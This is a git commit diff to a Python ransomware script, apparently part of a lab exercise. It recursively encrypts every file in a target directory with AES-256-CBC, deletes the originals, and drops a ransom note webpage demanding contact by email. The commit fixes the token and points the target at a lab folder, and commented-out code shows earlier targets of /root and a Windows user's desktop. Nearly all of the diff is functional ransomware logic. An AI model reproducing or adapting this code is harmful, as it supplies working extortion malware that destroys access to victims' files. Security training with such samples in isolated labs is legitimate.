290cefb3091ccc31d8cc67976626555327036903
Wambita <wambitafana@gmail.com>
2026-03-02 17:27:47 +0300

    Feat: add token to be  used as password and tested  it

--- Ransomware_Encrypt.py
+++ Ransomware_Encrypt.py
@@ -2,20 +2,20 @@ import  os
 import hashlib
 
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.backends import default_backend
 import platform
-from helpers import derive_key, PASSWORD
+from helpers import derive_key, TOKEN
 
 
-def encrypt_data(data: bytes, password: str) -> bytes:
+
+def encrypt_data(data: bytes, token: str = TOKEN) -> bytes:
     """Encrypt the data using AES-256-CBC."""
     # Generate a random salt
     salt = os.urandom(16)
     
     # Derive a key from the password and salt
-    key = derive_key(password, salt)
+    key = derive_key(token, salt)
     
     # Generate a random initialization vector (IV)
     iv = os.urandom(16)
@@ -31,21 +31,26 @@ def encrypt_data(data: bytes, password: str) -> bytes:
     # Encrypt the data
     ciphertext = encryptor.update(padded_data) + encryptor.finalize()
     
+    print(f"Token used for encryption: {token}")
     # Return the salt, IV, and ciphertext concatenated together
     return salt + iv + ciphertext
 
-def encrypt_file(file_path: str, password: str):
+def encrypt_file(file_path: str, token: str):
     """Encrypt and delete the file at the given path."""
     with open(file_path, 'rb') as f:
         file_data = f.read()
-    
-    encrypted_data = encrypt_data(file_data, password)
-    new_file_path = file_path + ".enc"
-    # Write the encrypted data back to the file
-    with open(file_path, 'wb') as f:
+
+    # Encrypt the data
+    encrypted_data = encrypt_data(file_data, token)
+
+    # Save to a new .enc file
+    enc_file_path = file_path + ".enc"
+    with open(enc_file_path, 'wb') as f:
         f.write(encrypted_data)
+
+    print(f"Encrypted: {file_path} -> {enc_file_path}")
     os.remove(file_path)
-    print(f"Encrypted and deleted: {file_path} -> {new_file_path}")
+    print(f"Encrypted and deleted: {file_path} -> {enc_file_path}")
 
 def encrypt_directory(directory: str, password: str):
     """Recursively encrypt all files in the given directory."""
@@ -55,51 +60,49 @@ def encrypt_directory(directory: str, password: str):
             encrypt_file(file_path, password)
         create_ransom_note_webpage(directory)
 
-
-    # Generate a random encryption code (for demonstration purposes)
-def generate_token(length=24):
-    import secrets, string
-    alphabet = string.ascii_uppercase + string.digits
-    return ''.join(secrets.choice(alphabet) for _ in range(length))
-
-
-def create_ransom_note_webpage(directory: str):
-    randomly_generated_code = generate_token()
+def create_ransom_note_webpage(directory: str, token: str = TOKEN):
     """Create a ransom note webpage in the given directory."""
     ransom_note_content = """
     <html>
     <head><title>Ransom Note</title></head>
     <body>
-        <h1> All of your files have been encrypted.!</h1>
+        <h1> All of your files have been encrypted!</h1>
         <p>To unlock them, contact me with your encryption code at sheilafana21@gmail.com.</p>
-        <p>Your encryption code is: {randomly_generated_code}</p>
+        <p>Your encryption code is: {TOKEN}</p>
     </body>
     </html>
     """
+    ransom_note_path = os.path.join(directory, "RANSOM_NOTE.html")
+    with open(ransom_note_path, 'w') as f:
+        f.write(ransom_note_content.format(TOKEN=token))
 
 def main():
-    # ascii_art = """
-    # _____                                                                              
-    #|  __ \                                                                             
-    #| |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
-    #|  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
-    #| | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
+    ascii_art = """
+      _____                                                                              
+     |  __ \                                                                             
+     | |__) |   __ _   _ __    ___    ___    _ __ ___   __      __   __ _   _ __    ___  
+     |  _  /   / _` | | '_ \  / __|  / _ \  | '_ ` _ \  \ \ /\ / /  / _` | | '__|  / _ \ 
+     | | \ \  | (_| | | | | | \__ \ | (_) | | | | | | |  \ V  V /  | (_| | | |    |  __/ 
+     |_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
+    """
+    print(ascii_art)
     #|_|  \_\  \__,_| |_| |_| |___/  \___/  |_| |_| |_|   \_/\_/    \__,_| |_|     \___| 
     #"""
     # print(ascii_art)
     # detect os
-    os_type = platform.system()
-    if os_type == "Windows":
-        target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
-    elif os_type == "Linux":
-        target = "/root"
-    else: 
-        print("Unsupported OS")
-        return
+    #os_type = platform.system()
+    #if os_type == "Windows":
+    #    target = r"C:\\Users\\%USERNAME%\\Desktop\\Ransomware_Test"
+    #elif os_type == "Linux":
+     #   target = "/root"
+    #else: 
+     #   print("Unsupported OS")
+      #  return
     
     # Encrypt the target directory
+    target = "/home/shfana/ransomware-lab/test2"
     if os.path.isdir(target):
-        encrypt_directory(target, PASSWORD)
+        encrypt_directory(target, TOKEN)
         create_ransom_note_webpage(target)
         print(f"Encryption complete. Ransom note created in: {target}")
     else:
